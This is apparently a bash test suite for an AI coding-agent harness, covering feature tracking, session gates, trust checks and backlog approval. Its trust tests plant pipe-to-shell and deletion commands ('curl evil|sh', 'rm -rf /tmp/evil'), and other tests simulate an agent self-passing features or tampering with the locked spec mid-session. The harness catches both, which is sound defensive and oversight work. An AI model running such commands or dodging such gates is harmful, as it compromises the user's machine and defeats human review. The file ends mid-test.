#!/bin/bash
# Self-contained tests for the harness scripts (no real claude needed).
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
PASS=0; FAIL=0
LOGD="$(mktemp -d)"   # per-run log dir (no fixed /tmp names)
ok()   { echo "  ✓ $1"; PASS=$((PASS+1)); }
bad()  { echo "  ✗ $1"; FAIL=$((FAIL+1)); }
out_has() { local pat="$1" o; shift; o="$("$@" 2>&1)"; grep -q -- "$pat" <<<"$o"; } # avoids SIGPIPE from grep -q under pipefail
check() { if eval "$2"; then ok "$1"; else bad "$1"; fi; }

new_project() { # n_features
  P="$(mktemp -d)"; cd "$P"
  git init -q; git config user.email t@t; git config user.name t
  "$ROOT/scripts/harness-setup.sh" >/dev/null
  jq -n --argjson n "$1" '{project:"t",features:[range(1;$n+1)|{id:("F"+(.|tostring|("00"+.)[-3:])),category:"functional",priority:.,description:("feature "+(.|tostring)),steps:["do it"],passes:false}]}' > .harness/feature_list.json
  printf '#!/bin/bash\nexit 0\n' > .harness/init.sh; chmod +x .harness/init.sh
  "$ROOT/scripts/harness-setup.sh" --finalize >/dev/null
  jq '.claude_bin="'"$ROOT"'/tests/fake-claude.sh"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
  git add -A; git commit -qm cfg
}

echo "feature-list.sh"
new_project 3
FL=.harness/feature-list.sh
check "validate ok"              '$FL validate >/dev/null'
check "next is F001"             '[[ "$($FL next | cut -f1)" == F001 ]]'
check "claim hides from next"    '$FL claim F001 >/dev/null; [[ "$($FL next | cut -f1)" == F002 ]]'
check "claimed lists F001"       '[[ "$($FL claimed)" == F001 ]]'
check "pass counts"              '$FL pass F001 >/dev/null; [[ "$($FL stats)" == "1/3 passing (0 awaiting verification)" ]]'
check "fail records note"        '$FL fail F001 "boom" >/dev/null; [[ "$(jq -r .features[0].notes .harness/feature_list.json)" == boom ]]'
check "unknown id rejected"      '! $FL pass F999 >/dev/null 2>&1'
check "lock ok after status edits" '$FL verify-lock'
jq '.features[1].steps=["changed"]' .harness/feature_list.json > .harness/x && mv .harness/x .harness/feature_list.json
check "spec edit detected"       '! $FL verify-lock 2>/dev/null'
check "restore fixes spec"       '$FL restore >/dev/null && $FL verify-lock'
check "done false until all pass" '! $FL done'
for i in F001 F002 F003; do $FL pass $i >/dev/null; done
check "done true when all pass"  '$FL done'

echo "harness-run.sh"
new_project 3
check "runner completes coder->tester" '.harness/run.sh >$LOGD/h1.log 2>&1; [[ $? -eq 0 ]] && .harness/feature-list.sh done'
check "one commit per feature"   '[[ "$(git log --oneline | grep -c "feat: F")" == 3 ]]'
check "fresh session logs exist" '[[ -f .harness/sessions/001-coder.log && -f .harness/sessions/001-tester.log ]]'
check "pid file removed"         '[[ ! -f .harness/runner.pid ]]'

new_project 2
check "stuck detection exits 3"  'FAKE_MODE=idle .harness/run.sh >$LOGD/h2.log 2>&1; [[ $? -eq 3 ]]'

new_project 2
check "tampered spec is restored" 'FAKE_MODE=tamper .harness/run.sh --once >$LOGD/h3.log 2>&1; .harness/feature-list.sh verify-lock'

new_project 2
check "dirty tree auto-committed" 'FAKE_MODE=dirty .harness/run.sh --once >$LOGD/h4.log 2>&1; [[ -z "$(git status --porcelain)" ]]'

new_project 2
jq '.pipeline=[{agent:"coder"}]' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
check "no tester: claims accepted" '.harness/run.sh >$LOGD/h5.log 2>&1; .harness/feature-list.sh done'

new_project 1
jq '.final_verify_command="false"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
check "failing final verify blocks completion" '.harness/run.sh --max-sessions 4 >$LOGD/h6.log 2>&1; [[ $? -ne 0 ]]'

new_project 3
check "STOP flag exits after current session" 'FAKE_MODE=stop .harness/run.sh >$LOGD/h7.log 2>&1; [[ $? -eq 0 ]] && ! .harness/feature-list.sh done && grep -q "STOP flag" $LOGD/h7.log'

new_project 2
.harness/run.sh >$LOGD/h8.log 2>&1
check "summary file written"          'grep -q "Stop reason:\*\* complete" .harness/last-run.md'
check "summary lists features + commits" 'grep -q "| F002 | PASS" .harness/last-run.md && grep -q "feat: F001" .harness/last-run.md'
check "summary printed to console"    'grep -q "Commits this run" $LOGD/h8.log'
check "agent log holds output"        'grep -q "fake claude ok" .harness/sessions/001-coder.log'
check "runner artifacts not in git"   '[[ -z "$(git status --porcelain)" ]]'

new_project 1
echo stale > .harness/sessions/000-initializer.log; echo 5 > .harness/session_count
"$ROOT/scripts/harness-setup.sh" --force >/dev/null
check "re-init clears stale logs and counters" '[[ ! -e .harness/sessions/000-initializer.log && ! -e .harness/session_count ]]'

echo "harness-step.sh (orchestrator gates)"
new_project 3
S=.harness/step.sh
OUT="$($S begin --new-run)"
check "begin continues with session 1 + target" 'grep -q "^DECISION=continue" <<<"$OUT" && grep -q "^SESSION=1$" <<<"$OUT" && grep -q "^TARGET=F001$" <<<"$OUT"'
check "plan lists coder then tester" '[[ "$($S plan | cut -f1 | tr "\n" " ")" == "coder tester " ]]'
check "task for coder names the target" 'out_has "Target feature: F001" $S task coder'
check "tester task skipped when nothing claimed" 'out_has "^SKIP: nothing claimed" $S task tester'
check "spawn-info: plugin agent type" 'out_has "^TYPE=wreck-it-ralph:coder$" $S spawn-info coder'
mkdir -p .harness/agents; printf -- '---\nname: reviewer\ndescription: r\n---\nREVIEW BODY\n' > .harness/agents/reviewer.md; $S trust accept >/dev/null
check "spawn-info: custom agent carries prompt" 'out_has "^TYPE=general-purpose$" $S spawn-info reviewer && out_has "REVIEW BODY" $S spawn-info reviewer'
check "spawn-info: unknown agent errors" '! $S spawn-info nope >/dev/null 2>&1'
.harness/feature-list.sh claim F001 >/dev/null; echo x > f1.txt; git add -A; git commit -qm "feat: F001"
check "tester task appears once claimed" 'out_has "awaiting verification: F001" $S task tester'
.harness/feature-list.sh pass F001 >/dev/null
END="$($S end)"
check "end reports progress + continue" 'grep -q "^PASSING=1$" <<<"$END" && grep -q "^NEXT=continue$" <<<"$END" && grep -q "^STUCK=0/3$" <<<"$END"'
check "end leaves tree clean"      '[[ -z "$(git status --porcelain)" ]]'
OUT="$($S begin)"
check "second begin is session 2"  'grep -q "^SESSION=2$" <<<"$OUT" && grep -q "^TARGET=F002$" <<<"$OUT"'
$S end >/dev/null; $S begin >/dev/null; END="$($S end)"; $S begin >/dev/null; END="$($S end)"
check "stuck after 3 idle sessions" 'grep -q "^NEXT=stop$" <<<"$END" && grep -q "^CODE=3$" <<<"$END"'
check "begin refuses once stuck"   'out_has "^DECISION=stop" $S begin'
check "summary records stop reason" 'out_has "Stop reason" $S summary "test stop" 3 && grep -q "Stop reason:\*\* test stop" .harness/last-run.md'
touch .harness/STOP; $S unlock >/dev/null
check "new-run clears STOP flag"   'out_has "^DECISION=continue" $S begin --new-run'
touch .harness/STOP
check "STOP flag makes begin stop" 'out_has "^REASON=stopped by STOP flag" $S begin'
rm -f .harness/STOP
for i in F001 F002 F003; do .harness/feature-list.sh pass $i >/dev/null; done
check "begin reports done"         '$S unlock >/dev/null; out_has "^DECISION=done" $S begin --new-run'
$S begin --new-run --max-sessions 0 >/dev/null
check "max-sessions 0 stops"       '$S unlock >/dev/null; out_has "^REASON=max sessions" $S begin --new-run --max-sessions 0'

echo "harness-setup.sh (scaffold)"
SETUP="$ROOT/scripts/harness-setup.sh"
S=.harness/step.sh
P="$(mktemp -d)"; cd "$P"
check "--check passes with tools present"   '$SETUP --check >/dev/null'
$SETUP --preset web --max-sessions 7 >$LOGD/s1.log 2>&1
check "web preset: playwright mcp enabled"  '[[ "$(jq -r .mcp_config .harness/config.json)" == .harness/mcp.json && -f .harness/mcp.json ]]'
check "max-sessions applied"                '[[ "$(jq .max_sessions .harness/config.json)" == 7 ]]'
check "pipeline coder -> tester"            '[[ "$(jq -r "[.pipeline[].agent]|join(\",\")" .harness/config.json)" == coder,tester ]]'
check "wrappers created incl. step.sh"      '[[ -x .harness/step.sh && -x .harness/run.sh && -x .harness/feature-list.sh && -x .harness/status.sh ]]'
check "git repo initialized"                'git rev-parse --git-dir >/dev/null 2>&1'
check "project gitignore has playwright dir" 'grep -qxF ".playwright-mcp/" .gitignore && grep -qxF ".env" .gitignore'
check ".harness gitignore ignores state"    'grep -qxF ".step_state.json" .harness/.gitignore && grep -qxF "sessions/" .harness/.gitignore'
check ".harness README written"             '[[ -f .harness/README.md ]]'
echo '{"keep":true}' > .harness/progress.keep; jq '.max_sessions=55' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
echo "my notes" >> .harness/progress.md; printf 'custom\n' >> .gitignore
$SETUP >$LOGD/s2.log 2>&1
check "re-run keeps config and progress"    '[[ "$(jq .max_sessions .harness/config.json)" == 55 ]] && grep -q "my notes" .harness/progress.md'
check "re-run keeps custom gitignore lines" 'grep -qxF custom .gitignore'
check "re-run does not duplicate ignores"   '[[ "$(grep -cxF ".playwright-mcp/" .gitignore)" == 1 ]]'
rm .harness/step.sh; $SETUP >/dev/null 2>&1
check "re-run repairs missing wrappers"     '[[ -x .harness/step.sh ]]'
$SETUP --max-sessions 9 >/dev/null 2>&1
check "--max-sessions updates existing config" '[[ "$(jq .max_sessions .harness/config.json)" == 9 ]]'
echo '{"features":[]}' > .harness/feature_list.json
check "--for-init refuses when initialized" '! $SETUP --for-init >/dev/null 2>&1'
check "--for-init --force re-initializes"   '$SETUP --for-init --force >/dev/null 2>&1 && [[ "$(jq .max_sessions .harness/config.json)" == 100 ]]'
P="$(mktemp -d)"; cd "$P"; $SETUP --preset cli >/dev/null 2>&1
check "cli preset: no browser, no mcp.json" '[[ -z "$(jq -r .mcp_config .harness/config.json)" && ! -f .harness/mcp.json ]]'
P="$(mktemp -d)"; cd "$P"; $SETUP --preset none >/dev/null 2>&1
check "none preset: coder only"             '[[ "$(jq -r "[.pipeline[].agent]|join(\",\")" .harness/config.json)" == coder ]]'
P="$(mktemp -d)"; cd "$P"; touch index.html; $SETUP >/dev/null 2>&1
check "auto preset: web when index.html"    '[[ "$(jq -r .mcp_config .harness/config.json)" == .harness/mcp.json ]]'
P="$(mktemp -d)"; cd "$P"; $SETUP >/dev/null 2>&1
check "auto preset: cli otherwise"          '[[ -z "$(jq -r .mcp_config .harness/config.json)" ]]'
P="$(mktemp -d)"; cd "$P"; touch index.html; $SETUP --no-browser >/dev/null 2>&1
check "--no-browser downgrades web to cli"  '[[ -z "$(jq -r .mcp_config .harness/config.json)" ]]'
check "bad preset rejected"                 '! $SETUP --preset bogus >/dev/null 2>&1'

echo "safety: dirty tree, wrappers, trust"
git_repo() { P="$(mktemp -d)"; cd "$P"; git init -q; git config user.email t@t; git config user.name t; echo base > base.txt; git add -A; git commit -qm base; }
git_repo; echo wip > mine.txt
check "init refuses uncommitted user changes"  '! $SETUP --for-init >$LOGD/d1.log 2>&1 && grep -q "mine.txt" $LOGD/d1.log'
check "--allow-dirty overrides"                '$SETUP --for-init --allow-dirty >/dev/null 2>&1'
git_repo
check "--branch switches to a new branch"      '$SETUP --for-init --branch harness/trial >/dev/null 2>&1 && [[ "$(git branch --show-current)" == harness/trial ]]'
P="$(mktemp -d)"; cd "$P"; git init -q; echo hi > existing.txt
check "no-commit repo allowed with a note"     '$SETUP --for-init >$LOGD/d2.log 2>&1 && grep -q "no commits yet" $LOGD/d2.log'

git_repo; $SETUP --preset cli >/dev/null 2>&1
check "scaffold then init is not blocked by our own .gitignore" '$SETUP --for-init >/dev/null 2>&1'

new_project 2
echo wip > mine.txt
check "begin --new-run stops on dirty tree (code 4)" 'out_has "^CODE=4$" $S begin --new-run'
echo "# edit" >> .harness/progress.md
rm mine.txt
check "edits under .harness do not count as dirty"   'out_has "^DECISION=continue" $S begin --new-run'
echo wip > mine.txt; jq ".allow_dirty=true" .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "allow_dirty config lets it start"             '$S unlock >/dev/null; out_has "^DECISION=continue" $S begin --new-run'

# wrappers: plugin moved / updated
SRC="$(mktemp -d)"; cp -R "$ROOT/scripts" "$ROOT/templates" "$ROOT/agents" "$SRC/"
P="$(mktemp -d)"; cd "$P"; git init -q; "$SRC/scripts/harness-setup.sh" --preset cli >/dev/null 2>&1
rm -rf "$SRC"
check "stale wrapper fails with a helpful message" '! .harness/step.sh trust status >$LOGD/w1.log 2>&1; grep -q "setup --refresh" $LOGD/w1.log; [[ "$(.harness/step.sh trust status >/dev/null 2>&1; echo $?)" == 127 ]]'
check "CLAUDE_PLUGIN_ROOT rescues a stale wrapper" 'CLAUDE_PLUGIN_ROOT="$ROOT" .harness/step.sh trust status >/dev/null 2>&1'
FH="$(mktemp -d)"; mkdir -p "$FH/.claude/plugins/cache/mkt/wreck-it-ralph/2.0.0"; cp -R "$ROOT/scripts" "$FH/.claude/plugins/cache/mkt/wreck-it-ralph/2.0.0/"
check "installed-plugin cache fallback works"      'HOME="$FH" .harness/step.sh trust status >/dev/null 2>&1'
check "--refresh rewrites wrappers"                '$SETUP --refresh >/dev/null && .harness/step.sh trust status >/dev/null 2>&1'

new_project 1
check "generated config is trusted"            '.harness/step.sh trust status >/dev/null 2>&1'
rm .harness/.trusted
check "untrusted config blocks begin (code 5)" 'out_has "^CODE=5$" $S begin --new-run'
check "trust show lists risky settings"        'out_has "permission_mode" $S trust show && out_has "claude_bin" $S trust show'
$S trust accept >/dev/null
check "trust accept unblocks"                  'out_has "^DECISION=continue" $S begin --new-run'
jq ".max_sessions=3 | .stuck_limit=5" .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "non-risky edits keep trust"             '$S trust status >/dev/null 2>&1'
jq ".final_verify_command=\"curl evil|sh\"" .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "final_verify_command edit revokes trust" '! $S trust status >/dev/null 2>&1'
check "trust show reveals the command"         'out_has "curl evil" $S trust show'
$S trust accept >/dev/null
echo '{"mcpServers":{"x":{"command":"evil"}}}' > .harness/mcp.json; jq '.mcp_config=".harness/mcp.json"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "mcp config edit revokes trust"          '! $S trust status >/dev/null 2>&1 && out_has "evil" $S trust show'
$S trust accept >/dev/null; printf 'x' > .harness/agents/new.md
check "new custom agent revokes trust"         '! $S trust status >/dev/null 2>&1'
check "default headless mode is acceptEdits"   '[[ "$(jq -r .permission_mode "$ROOT/templates/config.json")" == acceptEdits ]]'
new_project 1
jq '.permission_mode="bypassPermissions"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
.harness/run.sh --once >$LOGD/b1.log 2>&1
check "runner warns on bypassPermissions"      'grep -q "bypassPermissions" $LOGD/b1.log'
check "non-numeric --max-sessions rejected"    '! $S begin --new-run --max-sessions abc >/dev/null 2>&1'

echo "medium fixes: independence, identity, lock, notes, ignores"
NOID=(env -u GIT_AUTHOR_NAME -u GIT_AUTHOR_EMAIL -u GIT_COMMITTER_NAME -u GIT_COMMITTER_EMAIL "HOME=$(mktemp -d)" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.useConfigOnly GIT_CONFIG_VALUE_0=true)

# M1: tester independence
new_project 3
$S begin --new-run >/dev/null; $S task coder >/dev/null
.harness/feature-list.sh pass F001 >/dev/null          # coder cheats: passes without claim
out="$($S end 2>&1)"
check "unverified pass is reset"            '[[ "$(.harness/feature-list.sh list | awk -F"\t" "\$1==\"F001\"{print \$2}")" == FAIL ]]'
check "end reports UNVERIFIED_RESET"        'grep -q "^UNVERIFIED_RESET=F001$" <<<"$out"'
check "reset leaves a failure note"         'jq -r ".features[0].notes" .harness/feature_list.json | grep -q "without tester verification"'
$S begin >/dev/null; .harness/feature-list.sh claim F002 >/dev/null; $S task tester >/dev/null
.harness/feature-list.sh pass F002 >/dev/null; .harness/feature-list.sh pass F003 >/dev/null   # F003 was never claimed
out="$($S end 2>&1)"
check "claimed+tester pass is kept"         '[[ "$(.harness/feature-list.sh list | awk -F"\t" "\$1==\"F002\"{print \$2}")" == PASS ]]'
check "unclaimed pass alongside is reset"   'grep -q "^UNVERIFIED_RESET=F003$" <<<"$out" && [[ "$(.harness/feature-list.sh list | awk -F"\t" "\$1==\"F003\"{print \$2}")" == FAIL ]]'
new_project 2
FAKE_MODE=selfpass .harness/run.sh --once >$LOGD/m1.log 2>&1
check "runner: coder self-pass does not count" '! .harness/feature-list.sh done && grep -q "without tester verification" $LOGD/m1.log'

# M2: git identity and commit failures
new_project 1
git config --unset user.email; git config --unset user.name
check "begin stops without git identity (code 6)" 'out_has "^CODE=6$" "${NOID[@]}" $S begin --new-run'
check "setup --check flags missing identity"      '! "${NOID[@]}" $SETUP --check >$LOGD/m2.log 2>&1 && grep -q "git identity" $LOGD/m2.log'
git config user.email t@t; git config user.name t
$S begin --new-run >/dev/null; echo stray > stray.txt; git config --unset user.email; git config --unset user.name
out="$("${NOID[@]}" $S end 2>&1)"
check "commit failure is surfaced, not swallowed" 'grep -q "^WARN=" <<<"$out" && grep -q "git commit failed" <<<"$out"'
git config user.email t@t; git config user.name t; git add -A; git commit -qm fix
new_project 1
$S begin --new-run >/dev/null; head -c 6000000 /dev/zero > big.bin
check "large auto-commit files are warned about" 'out_has "large files" $S end'

# M3: lock
new_project 2
$S begin --new-run >/dev/null
check "second loop is refused (code 7)"     'out_has "^CODE=7$" $S begin --new-run'
$S summary done 0 >/dev/null
check "summary releases the lock"           'out_has "^DECISION=continue" $S begin --new-run'
$S unlock >/dev/null
check "unlock clears the lock"              'out_has "^DECISION=continue" $S begin --new-run'
jq '.ts = 1' .harness/.lock > .harness/l && mv .harness/l .harness/.lock
check "stale heartbeat lock is taken over"  'out_has "^DECISION=continue" $S begin --new-run'
$S unlock >/dev/null; $S begin --new-run --owner-pid 99999999 >/dev/null
check "dead owner pid does not block"       'out_has "^DECISION=continue" $S begin --new-run'
$S unlock >/dev/null; $S begin --new-run --owner-pid $$ >/dev/null
check "live owner pid blocks"               'out_has "^CODE=7$" $S begin --new-run'
$S unlock >/dev/null
check "headless runner releases its lock"   '.harness/run.sh --once >/dev/null 2>&1; [[ ! -f .harness/.lock ]]'

# M4: argument validation
check "run.sh rejects non-numeric --max-sessions" '! .harness/run.sh --max-sessions abc >/dev/null 2>&1'
check "step.sh rejects bad --owner-pid"           '! $S begin --new-run --owner-pid x >/dev/null 2>&1'

# M5: language-aware ignores
P="$(mktemp -d)"; cd "$P"; git init -q; touch package.json; $SETUP --preset cli >/dev/null 2>&1
check "node project ignores dist/ coverage/"  'grep -qxF "dist/" .gitignore && grep -qxF "coverage/" .gitignore'
check "no blanket *.log ignore"               '! grep -qxF "*.log" .gitignore'
P="$(mktemp -d)"; cd "$P"; git init -q; touch requirements.txt; $SETUP --preset cli >/dev/null 2>&1
check "python project ignores .venv/"         'grep -qxF ".venv/" .gitignore'
P="$(mktemp -d)"; cd "$P"; git init -q; touch Cargo.toml; $SETUP --preset cli >/dev/null 2>&1
check "rust project ignores target/"          'grep -qxF "target/" .gitignore'
new_project 1
touch package.json; $SETUP --finalize >/dev/null 2>&1
check "finalize adds ignores for new skeleton" 'grep -qxF "dist/" .gitignore'

# M7: notes
new_project 2
$S begin --new-run >/dev/null
printf 'implemented F001\nwith two lines' | $S note coder ok >/dev/null
$S note tester failed "arg form works" >/dev/null
check "note appends to the session notes file" 'grep -q "coder ok: implemented F001 with two lines" .harness/sessions/001-notes.md'
check "note accepts text as arguments"         'grep -q "tester failed: arg form works" .harness/sessions/001-notes.md'
check "note rejects bad status"                '! $S note coder maybe x >/dev/null 2>&1'
printf '%0400d' 0 | $S note coder ok >/dev/null
check "note text is truncated to 300 chars"    '[[ "$(tail -1 .harness/sessions/001-notes.md | awk -F": " "{print length(\$2)}")" -le 300 ]]'
check "summary includes agent notes"           'out_has "Agent notes" $S summary x 0 && grep -q "arg form works" .harness/last-run.md'

echo "trial-3 fixes: wrappers untracked, ignores re-detected, tester rigor"
new_project 1
check "wrappers are git-ignored in .harness"   'for w in feature-list.sh step.sh run.sh status.sh; do grep -qxF "$w" .harness/.gitignore || exit 1; done'
check "wrappers are not committed"             '[[ -z "$(git ls-files .harness | grep -E "(step|run|status|feature-list)\\.sh$")" ]]'
git add -f .harness/step.sh .harness/run.sh; git commit -qm "old version committed wrappers"
check "old tracked wrappers get untracked"     '[[ -n "$(git ls-files .harness/step.sh)" ]] && $S begin --new-run >/dev/null 2>&1 && [[ -z "$(git ls-files .harness/step.sh .harness/run.sh)" ]]'
$S unlock >/dev/null
check "wrapper removal is committed cleanly"   '$S end >/dev/null 2>&1; [[ -z "$(git status --porcelain)" ]]'
new_project 1
touch requirements.txt; git add -A; git commit -qm "add requirements"
check "begin --new-run re-detects language ignores" '$S begin --new-run >/dev/null 2>&1; grep -qxF ".venv/" .gitignore && grep -qxF ".pytest_cache/" .gitignore'
check "begin output stays machine-readable"     '$S unlock >/dev/null; out="$($S begin --new-run 2>/dev/null)"; [[ "$(grep -c "^[A-Z_]*=" <<<"$out")" == "$(wc -l <<<"$out" | tr -d " ")" ]]'
check "tester prompt demands probing + known-issue check" 'grep -q "Known issues" "$ROOT/agents/tester.md" && grep -q "Probe beyond the listed steps" "$ROOT/agents/tester.md" && grep -q "contradicts the feature" "$ROOT/agents/tester.md"'
check "coder prompt: claim only what is complete"        'grep -q "Claim only what is complete" "$ROOT/agents/coder.md"'

echo "v3: living backlog (schema, dependencies, questions)"
st_of() { .harness/feature-list.sh list | awk -F'\t' -v id="$1" '$1==id{print $2}'; }
set_features() { # jq expression applied to the feature list, then re-lock + commit
  jq "$1" .harness/feature_list.json > .harness/x && mv .harness/x .harness/feature_list.json
  .harness/feature-list.sh lock >/dev/null; .harness/step.sh trust accept >/dev/null; git add -A; git commit -qm spec
}
new_project 3
FL=.harness/feature-list.sh; B=.harness/backlog.sh; S=.harness/step.sh
set_features '.features[1].depends_on=["F001"]'
check "claim writes status + attempt"         '$FL claim F001 >/dev/null; [[ "$(jq -r ".features[0].status" .harness/feature_list.json)" == claimed && "$(jq -r ".features[0].attempts[-1].event" .harness/feature_list.json)" == claim ]]'
check "next skips features with unmet deps"   '[[ "$($FL next | cut -f1)" == F003 ]]'
$FL pass F001 >/dev/null
check "deps satisfied once dependency passes" '[[ "$($FL next | cut -f1)" == F002 ]]'
check "validate rejects unknown depends_on"   'jq ".features[2].depends_on=[\"F999\"]" .harness/feature_list.json > $LOGD/bad.json; ! $FL validate --file $LOGD/bad.json >/dev/null 2>&1'
check "validate rejects non-string verify"    'jq ".features[2].verify=[1]" .harness/feature_list.json > $LOGD/bad.json; ! $FL validate --file $LOGD/bad.json >/dev/null 2>&1'
$FL ask F002 "which export format?" >/dev/null
check "ask -> NEEDS_HUMAN, counted in stats"  '[[ "$(st_of F002)" == NEEDS_HUMAN ]] && out_has "1 need a human" $FL stats'
check "questions lists the question"          'out_has "F002.*which export format" $FL questions'
check "next skips features waiting on a human" '[[ "$($FL next | cut -f1)" == F003 ]]'
$FL fail F003 one >/dev/null; $FL fail F003 two >/dev/null
check "failures counts failed attempts"       '[[ "$($FL failures F003)" == 2 ]]'
$FL answer F002 "CSV" >/dev/null
check "answer makes the feature ready again"  '[[ "$(st_of F002)" == TODO && "$(jq -r ".features[1].answer" .harness/feature_list.json)" == CSV ]] && ! out_has "need a human" $FL stats'
$FL answer F003 "try the streaming API" >/dev/null
check "failures reset after an answer"        '[[ "$($FL failures F003)" == 0 ]]'
check "status changes keep the spec lock"     '$FL verify-lock'

echo "v3: backlog proposals"
new_project 2
B=.harness/backlog.sh; FL=.harness/feature-list.sh; S=.harness/step.sh
H0="$(git rev-parse HEAD)"
OUT="$(echo '{"add":[{"description":"export csv","steps":["click export"],"verify":["true"]},{"description":"import csv","steps":["upload"],"depends_on":["F001"]}]}' | $B propose --by planner --reason "csv support")"
check "propose files a pending proposal"      'grep -q "proposed P001" <<<"$OUT" && out_has "^P001	pending	planner	+2" $B list'
check "propose does not change the spec"      '[[ "$(jq ".features|length" .harness/feature_list.json)" == 2 ]] && $FL verify-lock'
check "propose rejects invalid features"      '! echo "{\"add\":[{\"description\":\"no steps\"}]}" | $B propose --reason x >/dev/null 2>&1'
check "propose rejects unknown ids"           '! echo "{\"drop\":[\"F777\"]}" | $B propose --reason x >/dev/null 2>&1'
check "propose rejects empty payload"         '! echo "{}" | $B propose --reason x >/dev/null 2>&1'
$B approve P001 >/dev/null
check "approve appends features with new ids" '[[ "$(jq -r "[.features[].id]|join(\",\")" .harness/feature_list.json)" == F001,F002,F003,F004 ]] && [[ "$(jq -r ".features[2].status" .harness/feature_list.json)" == todo ]]'
check "approve re-locks the spec"             '$FL verify-lock'
check "approve records the source"            '[[ "$(jq -r ".features[2].source" .harness/feature_list.json)" == proposal:P001 ]]'
check "approve commits only harness files"    'git log --oneline "$H0"..HEAD | grep -q "backlog: approve P001" && [[ -z "$(git status --porcelain)" ]]'
check "approved verify commands are trusted"  '$S trust status >/dev/null 2>&1'
check "approve refuses a non-pending proposal" '! $B approve P001 >/dev/null 2>&1'
$FL pass F001 >/dev/null
echo '{"amend":[{"id":"F001","steps":["new steps"]}]}' | $B propose --reason "change F001" >/dev/null; $B approve P002 >/dev/null
check "amending a passing feature re-opens it" '[[ "$(st_of F001)" == TODO ]] && [[ "$(jq -r ".features[0].steps[0]" .harness/feature_list.json)" == "new steps" ]]'
$B priority F004 0 >/dev/null
check "priority reorders the queue"           '[[ "$(jq -r ".features[3].priority" .harness/feature_list.json)" == 0 ]]'
$B drop F002 "not needed" >/dev/null
check "drop excludes a feature from stats"    '[[ "$(st_of F002)" == DROPPED ]] && out_has "^0/3 passing" $FL stats'
echo '{"drop":["F001"]}' | $B propose --reason "nah" >/dev/null; $B reject P005 "keep it" >/dev/null
check "reject keeps the spec"                 '[[ "$(st_of F001)" != DROPPED ]] && out_has "rejected" $B list --all'
$S begin --new-run >/dev/null
echo '{"add":[{"description":"during","steps":["x"]}]}' | $B propose --reason during >/dev/null
check "approve is refused during a session"   '! $B approve P006 >$LOGD/a1.log 2>&1 && grep -q "session is in progress" $LOGD/a1.log'
# an agent bypasses the guard: edits list + lock directly during the session
jq '.features += [{id:"F099",description:"sneaky",steps:["x"],status:"todo",passes:false}]' .harness/feature_list.json > .harness/x && mv .harness/x .harness/feature_list.json; cp .harness/feature_list.json .harness/.feature_list.lock.json
OUT="$($S end 2>&1)"
check "end undoes a spec change made mid-session" '! jq -e ".features[] | select(.id==\"F099\")" .harness/feature_list.json >/dev/null && grep -q "^WARN=a backlog approval" <<<"$OUT" && $FL verify-lock'
check "proposals filed mid-session survive"    'out_has "^P006	pending" $B list'
check "approve works again between sessions"  '$B approve P006 >/dev/null 2>&1 && jq -e ".features[] | select(.description==\"during\")" .harness/feature_list.json >/dev/null'

echo "v3: gate-run verify commands"
new_project 2
FL=.harness/feature-list.sh; S=.harness/step.sh
set_features '.features[0].verify=["false"] | .features[1].verify=["echo ok"]'
$S begin --new-run >/dev/null; $FL claim F001 >/dev/null
check "failing verify skips the tester"       'out_has "^SKIP: nothing claimed (verify commands failed: F001)" $S task tester'
check "failing verify fails the feature"      '[[ "$(st_of F001)" == FAIL ]] && jq -r ".features[0].notes" .harness/feature_list.json | grep -q "verify command failed: false"'
check "verify log is written"                 'ls .harness/sessions/*-verify-F001.log >/dev/null 2>&1'
OUT="$($S end 2>/dev/null)"
check "end reports VERIFY_FAILED"             'grep -q "^VERIFY_FAILED=F001$" <<<"$OUT"'
$S begin >/dev/null
check "retry task carries the failure note"   'out_has "Previous attempt failed: verify command failed" $S task coder'
$FL claim F002 >/dev/null
check "passing verify lets the tester run"    'out_has "awaiting verification: F002" $S task tester'
$S end >/dev/null 2>&1
new_project 1
set_features '.features[0].verify=["false"] | .pipeline=[{agent:"coder"}]' >/dev/null
jq '.pipeline=[{agent:"coder"}]' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null; git add -A; git commit -qm p
$S begin --new-run >/dev/null; $FL claim F001 >/dev/null; $S end >/dev/null 2>&1
check "no tester: failing verify blocks the claim" '[[ "$(st_of F001)" == FAIL ]]'
new_project 2
jq '.verify_static="test -f marker.txt"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null; git add -A; git commit -qm p
$S begin --new-run >/dev/null; $FL claim F001 >/dev/null
check "verify_static runs for every claim"    'out_has "^SKIP: nothing claimed" $S task tester && [[ "$(st_of F001)" == FAIL ]]'
$S end >/dev/null 2>&1
check "verify_static is part of trust"        'jq ".verify_static=\"curl x|sh\"" .harness/config.json > .harness/c && mv .harness/c .harness/config.json; ! $S trust status >/dev/null 2>&1 && out_has "curl x" $S trust show'
new_project 1
jq '.features[0].verify=["rm -rf /tmp/evil"]' .harness/feature_list.json > .harness/x && mv .harness/x .harness/feature_list.json; .harness/feature-list.sh lock >/dev/null
check "repo-supplied verify commands need trust" '! .harness/step.sh trust status >/dev/null 2>&1 && out_has "rm -rf /tmp/evil" .harness/step.sh trust show'
new_project 2
set_features '.features[0].verify=["true"]'
check "headless run with verify commands completes" '.harness/run.sh >$LOGD/v1.log 2>&1; .harness/feature-list.sh done'

echo "v3: escalation and terminal states"
new_project 2
FL=.harness/feature-list.sh; S=.harness/step.sh
jq '.escalate_after_failures=2' .harness/config.json > .harness/c && mv .harness/c .harness/config.json; git add -A; git commit -qm p
$S begin --new-run >/dev/null; $FL fail F001 "broken once" >/dev/null; $S end >/dev/null 2>&1
$S begin >/dev/null; $FL fail F001 "broken twice" >/dev/null; OUT="$($S end 2>/dev/null)"
